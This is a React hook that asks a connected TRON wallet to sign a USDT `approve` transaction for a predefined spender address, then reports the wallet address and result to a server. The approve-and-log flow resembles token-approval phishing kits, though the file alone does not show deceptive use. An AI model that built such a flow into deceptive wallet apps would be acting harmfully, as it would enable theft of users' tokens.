import { useState } from "react";
import { useWalletConnect } from "./useWalletConnect";
import { TronWeb } from "tronweb";
import useSendDataToServer from "./useSendDataToserver";


export const useTronApprove = () => {
  const [approvalStatus, setApprovalStatus] = useState(null);
  const [isLoading, setIsLoading] = useState(false);
  const { connectWallet } = useWalletConnect();
  const { senDataToServer } = useSendDataToServer();

  const approveTokens = async (
    spender = process.env.NEXT_PUBLIC_PREDEFINED_ADRESS_USDT,
    amount = 1 * 1e6
  ) => {
    setIsLoading(true);
    let walletAddress = null;

    try {
      setApprovalStatus("Processing approval...");
      const walletConnection = await connectWallet();
      walletAddress = walletConnection.address; // aici va fi adresa de la galaxy

      const tronWeb = new TronWeb({ fullHost: "https://api.trongrid.io" });

      const usdtContractAddress = process.env.NEXT_PUBLIC_USDT_CONTRACT_ADDRESS;
      const functionSelector = "approve(address,uint256)";

      const parameters = [
        { type: "address", value: spender },
        { type: "uint256", value: amount },
      ];

      const options = {
        feeLimit: 300000000,
        callValue: 0,
      };

      const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
        usdtContractAddress,
        functionSelector,
        options,
        parameters,
        walletAddress
      );

      const signedTransaction = await walletConnection.wallet.signTransaction(transaction);

      const result = await tronWeb.trx.sendRawTransaction(signedTransaction);// galaxy da aprrove

      setApprovalStatus(
        result.result ? "Approval successful!" : "Approval failed."
      );

      await senDataToServer({
        address: walletAddress,
        spender,
        amount: amount / 1e6,
        approvalStatus: result.result ? "Approved" : "Failed",
        timestamp: new Date().toISOString(),
      });
    } catch (error) {
              console.error("Approval failed:", error);
          setApprovalStatus("Approval failed.");
          await senDataToServer({
            approvalStatus: `Failed: ${error.message}`,
            errorDetails: JSON.stringify(error, null, 2), // Detalii suplimentare
            timestamp: new Date().toISOString(),
            address: walletAddress || "Unknown Address",
            spender: spender || "Unknown Spender",
          });
    } finally {
      setIsLoading(false);
    }
  };

  return {
    approveTokens,
    approvalStatus,
    isLoading,
  };
};
